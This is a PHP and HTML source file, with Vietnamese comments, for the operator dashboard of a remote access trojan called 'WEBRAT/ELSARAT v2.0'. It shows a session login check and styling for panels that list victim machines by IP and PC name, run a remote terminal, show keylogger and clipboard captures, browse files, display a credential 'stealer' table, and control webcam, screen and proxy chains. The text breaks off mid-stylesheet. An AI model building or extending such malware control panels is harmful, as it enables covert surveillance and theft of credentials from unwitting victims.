<?php
// ═══════════════════════════════════════════════════════
//  WEBRAT v2.0 — Dashboard chính
//  Đăng nhập qua login.php — tài khoản lưu trong database.
// ═══════════════════════════════════════════════════════

session_start();

if (!isset($_SESSION['webrat_user'])) {
    header('Location: login.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'logout') {
    session_destroy();
    header('Location: login.php');
    exit;
}

$authedUser = htmlspecialchars($_SESSION['webrat_user']);
$loggedIn   = true;
?>
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>ELSARAT v2.0</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --accent: #ff0090;
      --glow: rgba(255,0,144,0.4);
      --bg-alpha: 0.92;
      --text-primary:   #ffffff;
      --text-secondary: #e0e0e0;
      --text-muted:     #999999;
    }
    html, body { width: 100%; min-height: 100vh; background: transparent; }
    body { font-family: 'Share Tech Mono','Courier New',monospace; color: #fff; overflow-x: hidden; }
    input, select, textarea, button { color: #fff; }

    /* ─── BG ─── */
    #bg-layer {
      position: fixed; inset: 0; z-index: -2;
      background-color: #08050c;
      background-size: cover; background-position: center;
      transition: background-image .3s;
    }
    #bg-overlay {
      position: fixed; inset: 0; z-index: -1;
      background: rgba(8,5,18,var(--bg-alpha));
      transition: background .3s;
    }

    /* ─── HEADER ─── */
    .header {
      display:flex; align-items:center; justify-content:space-between;
      padding:0 20px; height:52px;
      background:rgba(5,3,12,.85);
      backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
      border-bottom:1px solid color-mix(in srgb, var(--accent) 35%, transparent);
      box-shadow:0 4px 20px rgba(0,0,0,.4);
      position:sticky; top:0; z-index:100;
    }
    .logo { font-size:16px; letter-spacing:3px; color:var(--accent); text-shadow:0 0 16px var(--glow); white-space:nowrap; display:flex; align-items:center; }
    .logo-img { height:44px; width:auto; margin-left:4px; filter:brightness(0) invert(1) sepia(1) saturate(500%) hue-rotate(296deg) brightness(1.0) drop-shadow(0 0 10px #ff009099); transition:filter .3s; vertical-align:middle; flex-shrink:0; }
    .nav { display:flex; align-items:center; gap:10px; flex-shrink:0; }
    .nav-btn {
      color:#fff; font-size:11px; letter-spacing:2px;
      cursor:pointer; font-family:inherit;
      background:none; border:none; transition:all .2s;
      white-space:nowrap; padding:5px 10px;
      border-radius:6px;
    }
    .nav-btn:hover { color:#ccc; background:rgba(255,255,255,.06); }
    .nav-btn.active { color:var(--accent); background:color-mix(in srgb, var(--accent) 10%, transparent); text-shadow:0 0 8px var(--glow); }
    .nav-sep { color:#2a2a3e; }
    .icon-btn {
      background:rgba(255,255,255,.04); border:1px solid #2a2a3e;
      color:#777; padding:6px 10px; cursor:pointer;
      font-size:14px; transition:all .2s; font-family:inherit;
      border-radius:8px; flex-shrink:0;
    }
    .icon-btn:hover { border-color:var(--accent); color:var(--accent); background:color-mix(in srgb, var(--accent) 8%, transparent); box-shadow:0 0 10px color-mix(in srgb, var(--accent) 20%, transparent); }
    .admin-btn {
      display:flex; align-items:center; gap:6px;
      border:1px solid #2a2a3e; padding:6px 14px;
      color:#bbb; font-size:11px; letter-spacing:1px;
      cursor:pointer; background:rgba(255,255,255,.05);
      transition:all .2s; font-family:inherit; white-space:nowrap;
      border-radius:20px;
    }
    .admin-btn:hover { border-color:var(--accent); color:var(--accent); background:color-mix(in srgb, var(--accent) 10%, transparent); box-shadow:0 0 12px color-mix(in srgb, var(--accent) 20%, transparent); }

    /* ─── TICKER ─── */
    .ticker {
      background:rgba(0,0,0,0.18); border-bottom:1px solid color-mix(in srgb, var(--accent) 8%, transparent);
      padding:5px 0; overflow:hidden; white-space:nowrap;
      font-size:10px; letter-spacing:1.5px; color:var(--accent);
    }
    .ticker-inner { display:inline-block; animation:ticker 36s linear infinite; }
    @keyframes ticker { from{transform:translateX(0)} to{transform:translateX(-50%)} }
    .ticker-item { display:inline-block; padding:0 40px; }
    .ticker-item.warn { color:#ffaa00; }

    /* ─── MAIN ─── */
    .main { padding:20px 18px; }
    .section-row { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; flex-wrap:wrap; gap:8px; }
    .section-title { display:flex; align-items:center; gap:10px; font-size:13px; letter-spacing:3px; }
    .bracket { display:inline-flex; align-items:center; justify-content:center; width:22px; height:22px; border:1px solid var(--accent); color:var(--accent); font-size:11px; border-radius:6px; background:color-mix(in srgb, var(--accent) 8%, transparent); }
    .search-wrap { position:relative; }
    .search-corner  { display:none; }
    .search-corner2 { display:none; }
    .search-icon { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:#555; pointer-events:none; }
    .search-input {
      background:rgba(0,0,0,.45); border:1px solid #2a2a3e;
      color:#999; font-family:inherit; font-size:12px;
      padding:8px 16px 8px 34px; width:260px; outline:none;
      letter-spacing:1px; transition:all .2s;
      border-radius:8px;
    }
    .search-input:focus { border-color:var(--accent); color:#fff; box-shadow:0 0 0 2px color-mix(in srgb, var(--accent) 12%, transparent); }
    .search-input::placeholder { color:#444; }

    /* ─── TABLE ─── */
    .table-wrap { border:1px solid #1a1a2e; background:rgba(0,0,0,.25); overflow:auto; border-radius:12px; box-shadow:0 4px 24px rgba(0,0,0,.3); }
    .table-wrap::after { content:''; display:block; height:3px; background:linear-gradient(90deg,var(--accent) 40%,color-mix(in srgb, var(--accent) 30%, transparent) 80%,transparent); border-radius:0 0 12px 12px; }
    .client-table { width:100%; border-collapse:collapse; font-size:12px; min-width:600px; }
    .client-table thead tr { background:color-mix(in srgb, var(--accent) 8%, transparent); border-bottom:1px solid color-mix(in srgb, var(--accent) 20%, transparent); }
    .client-table th { text-align:left; padding:12px 16px; color:var(--accent); letter-spacing:2px; font-size:10px; font-weight:normal; white-space:nowrap; }
    .client-table td { padding:13px 16px; color:#ccc; border-bottom:1px solid rgba(255,255,255,.03); vertical-align:middle; }
    .client-table tbody tr { background:rgba(255,255,255,.015); transition:background .15s,transform .1s; cursor:pointer; }
    .client-table tbody tr:hover { background:color-mix(in srgb, var(--accent) 6%, transparent); }
    .td-id { color:var(--accent); font-weight:bold; }
    .td-loc { color:#777; }
    .td-user { color:#fff; font-weight:bold; line-height:1.4; }
    .td-pcname { display:flex; align-items:center; gap:8px; color:#bbb; }
    .pc-icon { color:#555; font-size:13px; }
    .td-ip { color:#aaa; letter-spacing:1px; font-size:11px; }
    .ping-cell { display:flex; align-items:center; gap:8px; white-space:nowrap; }
    .dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
    .dot.on  { background:var(--accent); box-shadow:0 0 8px var(--accent); }
    .dot.rec { background:#888; }
    .dot.away{ background:#333; }
    .td-active { color:#666; max-width:180px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

    /* ─── STATS ─── */
    .stats-page { padding:20px 18px; }
    .stats-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:14px; margin-top:20px; }
    .stat-card { background:rgba(0,0,0,.35); border:1px solid #1a1a2e; border-top:2px solid var(--accent); padding:18px 20px; border-radius:10px; box-shadow:0 4px 16px rgba(0,0,0,.25); transition:transform .2s,box-shadow .2s; }
    .stat-card:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(0,0,0,.35), 0 0 20px color-mix(in srgb, var(--accent) 8%, transparent); }
    .stat-label { color:#555; font-size:9px; letter-spacing:2.5px; text-transform:uppercase; }
    .stat-val { color:var(--accent); font-size:26px; margin-top:8px; text-shadow:0 0 16px var(--glow); }
    .stat-sub { color:#444; font-size:10px; margin-top:4px; }

    /* ─── CLIENT PANEL ─── */
    .client-panel { display:none; flex:1; min-height:calc(100vh - 82px); }
    .client-panel.show { display:flex; }
    .cp-sidebar {
      width:116px; flex-shrink:0;
      background:rgba(3,2,10,.6); border-right:1px solid color-mix(in srgb, var(--accent) 15%, transparent);
      display:flex; flex-direction:column; overflow-y:auto;
      min-height:calc(100vh - 82px);
      backdrop-filter:blur(8px);
    }
    .back-btn {
      display:flex; align-items:center; gap:6px; padding:11px 12px;
      background:none; border:none; border-bottom:1px solid color-mix(in srgb, var(--accent) 12%, transparent);
      color:var(--accent); font-family:inherit; font-size:10px;
      letter-spacing:1px; cursor:pointer; transition:background .2s; width:100%; text-align:left;
      white-space:nowrap;
    }
    .back-btn:hover { background:color-mix(in srgb, var(--accent) 10%, transparent); }
    .cp-nav { flex:1; display:flex; flex-direction:column; padding:4px 6px; gap:2px; }
    .cp-tab {
      display:flex; align-items:center; gap:7px; padding:8px 10px;
      background:none; border:none;
      color:#fff; font-family:inherit; font-size:10px; letter-spacing:.3px;
      cursor:pointer; transition:all .15s; text-align:left; width:100%; position:relative;
      border-radius:8px;
    }
    .cp-tab:hover { background:rgba(255,255,255,.05); color:#fff; }
    .cp-tab.active { background:color-mix(in srgb, var(--accent) 14%, transparent); color:var(--accent); box-shadow:inset 0 0 0 1px color-mix(in srgb, var(--accent) 25%, transparent); }
    .cp-tab-icon { font-size:13px; flex-shrink:0; width:16px; text-align:center; }
    .cp-tab-label { font-size:9px; letter-spacing:.3px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .cp-dot { width:5px; height:5px; border-radius:50%; background:var(--accent); box-shadow:0 0 5px var(--accent); margin-left:auto; flex-shrink:0; }
    .cp-client-tag { display:flex; align-items:center; gap:6px; padding:8px 10px 4px; border-top:1px solid color-mix(in srgb, var(--accent) 12%, transparent); background:color-mix(in srgb, var(--accent) 6%, transparent); }
    .cp-client-name { font-size:9px; color:var(--accent); letter-spacing:.5px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .cp-offline-bar { display:flex; align-items:center; padding:4px 10px 8px; background:color-mix(in srgb, var(--accent) 6%, transparent); }
    .cp-content { flex:1; overflow:hidden; display:flex; flex-direction:column; min-width:0; }
    .tab-pane { display:none; flex:1; overflow-y:auto; padding:16px 18px; }
    .tab-pane.active { display:block; }

    /* Status dot */
    .status-dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; display:inline-block; }
    .status-dot.online { background:var(--accent); box-shadow:0 0 6px var(--accent); animation:pulse 2s infinite; }
    .status-dot.recent { background:#888; }
    .status-dot.away   { background:#444; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }

    /* ─── INFO TAB ─── */
    .info-box { background:rgba(0,0,0,.25); border:1px solid #1a1a2e; margin-bottom:16px; border-radius:10px; overflow:hidden; }
    .info-table { width:100%; border-collapse:collapse; font-size:12px; }
    .info-table tr { border-bottom:1px solid rgba(255,255,255,.04); }
    .info-table tr:last-child { border-bottom:none; }
    .info-key { color:#555; padding:9px 16px; width:150px; font-size:10px; letter-spacing:.5px; vertical-align:top; white-space:nowrap; text-transform:uppercase; }
    .info-val { color:#ddd; padding:9px 16px 9px 0; font-size:12px; }
    .comment-input {
      background:color-mix(in srgb, var(--accent) 5%, transparent); border:1px solid color-mix(in srgb, var(--accent) 20%, transparent);
      color:#999; font-family:inherit; font-size:12px;
      padding:6px 10px; width:100%; max-width:300px; outline:none;
      border-radius:6px;
    }
    .comment-input:focus { border-color:var(--accent); color:#fff; box-shadow:0 0 0 2px color-mix(in srgb, var(--accent) 10%, transparent); }
    .online-stats { margin-top:16px; }
    .stats-title { font-size:11px; color:#777; letter-spacing:2px; margin-bottom:12px; text-transform:uppercase; }
    .stats-bar-bg { display:flex; height:22px; overflow:hidden; border-radius:20px; background:rgba(255,255,255,.06); }
    .stats-bar-offline { background:rgba(255,255,255,.08); display:flex; align-items:center; justify-content:center; }
    .stats-bar-online  { background:linear-gradient(90deg,var(--accent),color-mix(in srgb, var(--accent) 70%, transparent)); display:flex; align-items:center; justify-content:center; }
    .stats-bar-label { font-size:9px; color:rgba(255,255,255,.7); padding:0 6px; white-space:nowrap; }
    .stats-legend { display:flex; gap:16px; margin-top:8px; }
    .legend-item { display:flex; align-items:center; gap:6px; font-size:10px; color:#555; }
    .legend-dot { width:8px; height:8px; border-radius:50%; }
    .offline-dot { background:rgba(255,255,255,.12); border:1px solid #333; }
    .online-dot  { background:var(--accent); box-shadow:0 0 6px var(--glow); }

    /* ─── TERMINAL ─── */
    .terminal-wrap { display:flex; flex-direction:column; background:rgba(0,0,0,.45); border:1px solid #1a1a2e; font-size:12px; height:380px; border-radius:10px; overflow:hidden; box-shadow:0 4px 20px rgba(0,0,0,.3); }
    .term-out { flex:1; overflow-y:auto; padding:14px; color:#bbb; line-height:1.7; white-space:pre-wrap; word-break:break-all; }
    .term-line { margin-bottom:2px; }
    .term-input-row { display:flex; align-items:center; border-top:1px solid color-mix(in srgb, var(--accent) 12%, transparent); padding:8px 14px; gap:10px; background:color-mix(in srgb, var(--accent) 4%, transparent); }
    .term-prompt { color:var(--accent); flex-shrink:0; font-size:14px; }
    .term-input { flex:1; background:none; border:none; color:#ddd; font-family:inherit; font-size:12px; outline:none; caret-color:var(--accent); min-width:0; }

    /* ─── KEYLOGGER (clipboard time) ─── */
    .keylog-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; flex-wrap:wrap; gap:8px; }
    .kl-count { color:#555; font-size:11px; letter-spacing:1px; }
    .kl-time { color:#555; font-size:10px; }
    .kl-win  { color:var(--accent); font-size:10px; }
    .kl-text { color:#bbb; font-size:12px; word-break:break-all; }

    /* ─── QUICK TOOLS GRID ─── */
    .quick-tools-grid {
      display:grid;
      grid-template-columns:repeat(auto-fill,minmax(130px,1fr));
      gap:8px;
      margin-top:12px;
    }
    .quick-tools-grid .tool-btn {
      padding:10px 8px;
      font-size:11px;
      letter-spacing:0.5px;
      text-align:center;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:6px;
    }
    @media (max-width:767px) {
      .quick-tools-grid {
        grid-template-columns:repeat(2,1fr);
      }
    }

    /* ─── FILE MANAGER ─── */
    .file-path-bar { display:flex; align-items:center; gap:8px; margin-bottom:12px; background:rgba(0,0,0,.3); border:1px solid #1a1a2e; padding:8px 12px; border-radius:8px; }
    .file-path-icon { color:var(--accent); flex-shrink:0; }
    .file-path-input { flex:1; background:none; border:none; color:#ccc; font-family:inherit; font-size:12px; outline:none; min-width:0; }
    .file-table { width:100%; border-collapse:collapse; font-size:12px; min-width:400px; }
    .file-table thead tr { background:color-mix(in srgb, var(--accent) 7%, transparent); border-bottom:1px solid color-mix(in srgb, var(--accent) 18%, transparent); }
    .file-table th { text-align:left; padding:9px 12px; color:var(--accent); font-size:10px; letter-spacing:2px; font-weight:normal; white-space:nowrap; }
    .file-table td { padding:9px 12px; border-bottom:1px solid rgba(255,255,255,.03); }
    .file-row { transition:background .15s; cursor:pointer; }
    .file-row:hover { background:color-mix(in srgb, var(--accent) 5%, transparent); }
    .file-row.selected { background:color-mix(in srgb, var(--accent) 10%, transparent) !important; }
    /* custom checkbox */
    .fm-cb { display:inline-flex; align-items:center; justify-content:center; width:15px; height:15px; border:1.5px solid #444; border-radius:3px; cursor:pointer; flex-shrink:0; transition:border-color .15s, background .15s; user-select:none; }
    .fm-cb:hover { border-color:var(--accent); }
    .fm-cb.checked { border-color:var(--accent); background:var(--accent); }
    .fm-cb.checked::after { content:'✓'; color:#000; font-size:10px; line-height:1; font-weight:bold; }
    .file-table th.cb-th, .file-table td.cb-td { padding:9px 6px 9px 12px; width:28px; }
    .file-name { color:#ccc; }
    .dir-name  { color:#7799ee; }
    .task-bar { display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; flex-wrap:wrap; gap:8px; }
    .fm-panel { display:flex; align-items:center; gap:8px; flex-wrap:wrap; background:rgba(0,0,0,.35); border:1px solid color-mix(in srgb, var(--accent) 22%, transparent); border-radius:8px; padding:8px 12px; margin-bottom:12px; animation:fadeInDown .18s ease; }
    .fm-panel-label { color:var(--accent); font-size:10px; letter-spacing:2px; white-space:nowrap; flex-shrink:0; }
    .fm-panel-input { flex:1; min-width:140px; background:rgba(255,255,255,.05); border:1px solid #252535; border-radius:6px; color:#eee; font-family:inherit; font-size:12px; padding:4px 10px; outline:none; transition:border-color .2s; }
    .fm-panel-input:focus { border-color:var(--accent); }
    .fm-file-label { flex:1; min-width:140px; background:rgba(255,255,255,.05); border:1px solid #252535; border-radius:6px; color:#888; font-family:inherit; font-size:11px; letter-spacing:.5px; padding:4px 10px; cursor:pointer; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; transition:border-color .2s; }
    .fm-file-label:hover { border-color:var(--accent); color:#ccc; }
    @keyframes fadeInDown { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }

    /* ─── CLIPBOARD ─── */
    .clipboard-entry { background:rgba(0,0,0,.25); border:1px solid #1a1a2e; padding:10px 14px; margin-bottom:6px; border-radius:8px; transition:border-color .2s; }
    .clipboard-entry:hover { border-color:color-mix(in srgb, var(--accent) 20%, transparent); }
    .clipboard-text { color:#bbb; font-size:12px; word-break:break-all; margin-top:4px; }

    /* ─── REMOTE / WEBCAM ─── */
    .remote-screen { border:1px solid #1a1a2e; background:rgba(0,0,0,.35); height:240px; display:flex; align-items:center; justify-content:center; margin-bottom:14px; position:relative; overflow:hidden; border-radius:10px; }
    .remote-placeholder { display:flex; flex-direction:column; align-items:center; gap:10px; }
    .remote-icon  { font-size:44px; color:#222; }
    .remote-label { color:#555; font-size:13px; letter-spacing:3px; }
    .remote-sub   { color:#333; font-size:11px; letter-spacing:1px; }
    .connect-btn { background:color-mix(in srgb, var(--accent) 10%, transparent); border:1px solid var(--accent); color:var(--accent); padding:9px 20px; font-family:inherit; font-size:12px; letter-spacing:2px; cursor:pointer; transition:all .2s; border-radius:8px; }
    .connect-btn:hover { background:color-mix(in srgb, var(--accent) 22%, transparent); box-shadow:0 0 16px var(--glow); }
    .remote-tools { display:flex; gap:8px; flex-wrap:wrap; }
    .scan-line { position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,transparent,var(--accent),transparent); animation:scanv 3s linear infinite; opacity:.35; }
    @keyframes scanv { 0%{top:0} 100%{top:100%} }

    /* ─── BUTTONS ─── */
    .tool-btn { background:rgba(255,255,255,.04); border:1px solid #252535; color:#fff; padding:5px 12px; font-family:inherit; font-size:12px; letter-spacing:1px; cursor:pointer; transition:all .2s; border-radius:7px; }
    .tool-btn:hover { border-color:var(--accent); color:var(--accent); background:color-mix(in srgb, var(--accent) 7%, transparent); box-shadow:0 0 8px color-mix(in srgb, var(--accent) 15%, transparent); }
    .tool-btn.sm { padding:3px 8px; font-size:11px; border-radius:6px; }
    .tool-btn.lg { padding:8px 16px; font-size:13px; border-radius:8px; }
    .tool-btn.danger { border-color:rgba(192,57,43,.5); color:#c0392b; }
    .tool-btn.danger:hover { background:rgba(192,57,43,.15); border-color:#c0392b; box-shadow:0 0 8px rgba(192,57,43,.2); }
    .tool-btn.warn { border-color:rgba(200,160,0,.5); color:#e6b800; }
    .tool-btn.warn:hover { background:rgba(200,160,0,.15); border-color:#e6b800; color:#ffe033; box-shadow:0 0 8px rgba(200,160,0,.25); }

    /* ─── ROLL / SCREENSHOTS ─── */
    .roll-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:10px; }
    .roll-item { border:1px solid #1a1a2e; background:rgba(0,0,0,.25); cursor:pointer; transition:all .2s; border-radius:10px; overflow:hidden; }
    .roll-item:hover { border-color:var(--accent); box-shadow:0 0 16px color-mix(in srgb, var(--accent) 15%, transparent); transform:translateY(-2px); }
    .roll-thumb { height:90px; background:color-mix(in srgb, var(--accent) 4%, transparent); display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden; }
    .roll-thumb img { width:100%; height:100%; object-fit:cover; }
    .roll-placeholder { font-size:28px; color:#222; }
    .roll-meta { padding:7px 10px; }
    .roll-time { font-size:9px; color:#555; }
    .roll-btn-row { display:flex; gap:6px; margin-top:4px; }

    /* ─── CODE EDITOR ─── */
    .code-wrap { display:flex; flex-direction:column; gap:10px; }
    .code-toolbar { display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px; }
    .code-lang-sel { background:rgba(0,0,0,.5); border:1px solid #2a2a3e; color:#888; font-family:inherit; font-size:11px; padding:6px 10px; outline:none; cursor:pointer; border-radius:7px; }
    .code-lang-sel:focus { border-color:var(--accent); }
    .code-editor { width:100%; background:rgba(0,0,0,.45); border:1px solid #1a1a2e; color:#ccc; font-family:inherit; font-size:12px; padding:14px; resize:vertical; outline:none; line-height:1.7; min-height:180px; tab-size:4; border-radius:10px; }
    .code-editor:focus { border-color:var(--accent); box-shadow:0 0 0 2px color-mix(in srgb, var(--accent) 10%, transparent); }
    .code-output { background:rgba(0,0,0,.35); border:1px solid #1a1a2e; border-left:2px solid var(--accent); padding:12px 14px; min-height:60px; color:#aaa; font-size:12px; white-space:pre-wrap; word-break:break-all; border-radius:0 8px 8px 0; }

    /* ─── STEALER ─── */
    .stealer-tabs { display:flex; gap:4px; margin-bottom:14px; padding-bottom:8px; border-bottom:1px solid #1a1a2e; }
    .stealer-tab { background:rgba(255,255,255,.03); border:1px solid transparent; border-radius:8px; color:#555; font-family:inherit; font-size:11px; letter-spacing:1px; padding:6px 14px; cursor:pointer; transition:all .2s; }
    .stealer-tab:hover { color:#aaa; background:rgba(255,255,255,.06); }
    .stealer-tab.active { color:var(--accent); background:color-mix(in srgb, var(--accent) 10%, transparent); border-color:color-mix(in srgb, var(--accent) 25%, transparent); }
    .stealer-table { width:100%; border-collapse:collapse; font-size:11px; min-width:400px; }
    .stealer-table th { text-align:left; padding:8px 10px; color:var(--accent); font-size:10px; letter-spacing:2px; font-weight:normal; background:color-mix(in srgb, var(--accent) 7%, transparent); border-bottom:1px solid color-mix(in srgb, var(--accent) 18%, transparent); white-space:nowrap; }
    .stealer-table td { padding:8px 10px; border-bottom:1px solid rgba(255,255,255,.03); color:#ccc; font-size:11px; }
    .stealer-table tr:hover td { background:color-mix(in srgb, var(--accent) 4%, transparent); }
    .masked-pass { color:#555; letter-spacing:2px; cursor:pointer; }
    .masked-pass:hover { color:var(--accent); }

    /* ─── PROXY ─── */
    .proxy-status { display:flex; align-items:center; gap:8px; font-size:12px; letter-spacing:2px; margin-bottom:16px; }
    .proxy-form { display:flex; flex-direction:column; gap:10px; max-width:380px; }
    .proxy-row { display:flex; align-items:center; gap:10px; }
    .proxy-label { color:#555; font-size:10px; letter-spacing:1px; width:100px; flex-shrink:0; text-transform:uppercase; }
    .proxy-input { flex:1; background:rgba(0,0,0,.4); border:1px solid #1a1a2e; color:#ccc; font-family:inherit; font-size:12px; padding:8px 12px; outline:none; min-width:0; border-radius:8px; }
    .proxy-input:focus { border-color:var(--accent); box-shadow:0 0 0 2px color-mix(in srgb, var(--accent) 10%, transparent); }
    .proxy-select { flex:1; background:rgba(0,0,0,.4); border:1px solid #1a1a2e; color:#ccc; font-family:inherit; font-size:12px; padding:8px 12px; outline:none; cursor:pointer; border-radius:8px; }
    .proxy-select:focus { border-color:var(--accent); }
    .proxy-chain { background:rgba(0,0,0,.25); border:1px solid #1a1a2e; padding:14px; margin-top:16px; border-radius:10px; }
    .proxy-chain-title { color:var(--accent); font-size:10px; letter-spacing:2px; margin-bottom:10px; text-transform:uppercase; }
    .chain-entry { display:flex; align-items:center; gap:8px; padding:7px 0; border-bottom:1px solid rgba(255,255,255,.03); }
    .chain-num { color:var(--accent); font-size:10px; width:20px; }
    .chain-ip { color:#ccc; font-size:11px; flex:1; }
    .chain-status { width:8px; height:8px; border-radius:50%; flex-shrink:0; }

    /* ─── COMMS ─── */
    .comms-wrap { display:flex; flex-direction:column; height:360px; }
    .comms-msgs { flex:1; background:rgba(0,0,0,.3); border:1px solid #1a1a2e; padding:12px; overflow-y:auto; }
    .comms-msg { font-size:12px; margin-bottom:10px; }
    .comms-msg-admin { color:var(--accent); }
    .comms-msg-client { color:#aaa; }
    .comms-msg-time { font-size:10px; color:#444; }
    .comms-input-row { display:flex; gap:8px; align-items:center; border:1px solid #1a1a2e; border-top:none; background:rgba(0,0,0,.3); padding:8px 12px; }
    .comms-input { flex:1; background:none; border:none; color:#ddd; font-family:inherit; font-size:12px; outline:none; min-width:0; }
    .comms-actions { display:flex; gap:8px; margin-top:12px; flex-wrap:wrap; }

    /* ─── TASK MANAGER ─── */
    .task-list { display:flex; flex-direction:column; gap:4px; }
    .task-item { display:flex; align-items:center; gap:10px; background:rgba(0,0,0,.3); border:1px solid #1a1a2e; padding:9px 12px; transition:background .15s; }
    .task-item:hover { background:color-mix(in srgb, var(--accent) 4%, transparent); }
    .task-pid { color:var(--accent); font-size:11px; width:50px; flex-shrink:0; }
    .task-name { color:#ccc; font-size:12px; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .task-cpu { color:#888; font-size:10px; width:60px; text-align:right; flex-shrink:0; }
    .task-mem { color:#777; font-size:10px; width:70px; text-align:right; flex-shrink:0; }
    .task-cb { display:inline-flex; align-items:center; justify-content:center; width:14px; height:14px; border:1.5px solid #444; border-radius:3px; cursor:pointer; flex-shrink:0; transition:border-color .15s, background .15s; user-select:none; }
    .task-cb:hover { border-color:var(--accent); }
    .task-cb.checked { border-color:var(--accent); background:var(--accent); }
    .task-cb.checked::after { content:'✓'; color:#000; font-size:9px; line-height:1; font-weight:bold; }

    /* ─── SETTINGS PANEL ─── */
    .settings-panel {
      position:fixed; top:50px; right:0; width:300px;
      background:rgba(8,5,18,.98);
      border:1px solid color-mix(in srgb, var(--accent) 35%, transparent); border-right:none;
      border-radius:16px 0 0 16px;
      z-index:200; transform:translateX(100%);
      transition:transform .35s cubic-bezier(.4,0,.2,1);
      max-height:calc(100vh - 58px); overflow-y:auto;
      box-shadow:-8px 0 40px rgba(0,0,0,.6), -2px 0 20px color-mix(in srgb, var(--accent) 8%, transparent);
    }
    .settings-panel.open { transform:translateX(0); }
    .settings-backdrop { display:none; position:fixed; inset:0; z-index:190; background:rgba(0,0,0,.25); backdrop-filter:blur(2px); }
    .settings-backdrop.open { display:block; }
    .sp-header {
      background:linear-gradient(135deg,color-mix(in srgb, var(--accent) 15%, transparent),color-mix(in srgb, var(--accent) 6%, transparent));
      border-bottom:1px solid color-mix(in srgb, var(--accent) 20%, transparent);
      padding:14px 16px;
      display:flex; align-items:center; justify-content:space-between;
      position:sticky; top:0; z-index:1;
      border-radius:16px 0 0 0;
      backdrop-filter:blur(12px);
    }
    .sp-title { color:var(--accent); letter-spacing:2px; font-size:12px; display:flex; align-items:center; gap:8px; }
    .sp-title-icon { font-size:16px; }
    .sp-close {
      background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.1);
      color:#777; cursor:pointer; font-size:13px; font-family:inherit;
      transition:all .2s; width:28px; height:28px; border-radius:8px;
      display:flex; align-items:center; justify-content:center;
    }
    .sp-close:hover { border-color:color-mix(in srgb, var(--accent) 50%, transparent); color:var(--accent); background:color-mix(in srgb, var(--accent) 10%, transparent); }
    .sp-body { padding:16px 14px; display:flex; flex-direction:column; gap:14px; }
    .sg {
      background:rgba(255,255,255,.025);
      border:1px solid rgba(255,255,255,.06);
      border-radius:12px;
      padding:12px 14px;
    }
    .sg label {
      display:block; color:#888; font-size:9px; letter-spacing:1.5px;
      text-transform:uppercase; margin-bottom:10px;
      display:flex; align-items:center; gap:6px;
    }
    .sg label::after { content:''; flex:1; height:1px; background:rgba(255,255,255,.06); }
    .color-row { display:flex; align-items:center; gap:10px; }
    .color-picker {
      width:38px; height:38px; border:2px solid rgba(255,255,255,.1);
      background:none; cursor:pointer; padding:3px;
      border-radius:10px; transition:border-color .2s;
    }
    .color-picker:hover { border-color:var(--accent); }
    .hex-input {
      background:rgba(0,0,0,.4); border:1px solid rgba(255,255,255,.1);
      color:#ccc; font-family:inherit; font-size:12px;
      padding:8px 12px; flex:1; outline:none; letter-spacing:1px;
      border-radius:8px; transition:all .2s;
    }
    .hex-input:focus { border-color:var(--accent); color:#fff; box-shadow:0 0 0 2px color-mix(in srgb, var(--accent) 12%, transparent); }
    .presets { display:flex; gap:7px; flex-wrap:wrap; margin-top:10px; }
    .pdot { width:22px; height:22px; border-radius:50%; cursor:pointer; border:2px solid transparent; transition:all .2s; box-shadow:0 2px 6px rgba(0,0,0,.3); }
    .pdot:hover { border-color:rgba(255,255,255,.6); transform:scale(1.2); }
    .pdot.active { border-color:#fff; transform:scale(1.2); box-shadow:0 0 10px rgba(255,255,255,.3); }
    .pdot.rainbow-dot {
      background:conic-gradient(red,orange,yellow,lime,cyan,blue,violet,red);
      animation:none;
    }
    .pdot.rainbow-dot.active { border-color:#fff; animation:none; }
    .pdot.rainbow-dot:hover { transform:scale(1.2) rotate(30deg); }
    .opacity-row { display:flex; align-items:center; gap:10px; }
    .slider {
      flex:1; -webkit-appearance:none; height:5px;
      background:linear-gradient(90deg,var(--accent) var(--v,92%),rgba(255,255,255,.1) var(--v,92%));
      border-radius:3px; outline:none; cursor:pointer;
    }
    .slider::-webkit-slider-thumb {
      -webkit-appearance:none; width:16px; height:16px; border-radius:50%;
      background:var(--accent); box-shadow:0 0 8px var(--glow);
      cursor:pointer; border:2px solid rgba(255,255,255,.2);
      transition:transform .15s;
    }
    .slider::-webkit-slider-thumb:hover { transform:scale(1.2); }
    .sval { color:var(--accent); font-size:12px; min-width:36px; text-align:right; font-weight:bold; }
    .upload-area {
      border:1px dashed rgba(255,255,255,.12); padding:14px;
      text-align:center; cursor:pointer; transition:all .2s;
      border-radius:10px; background:rgba(0,0,0,.2);
    }
    .upload-area:hover { border-color:var(--accent); background:color-mix(in srgb, var(--accent) 5%, transparent); }
    .upload-area span { color:#555; font-size:11px; letter-spacing:1px; }
    #bg-preview-img {
      width:100%; height:60px; object-fit:cover;
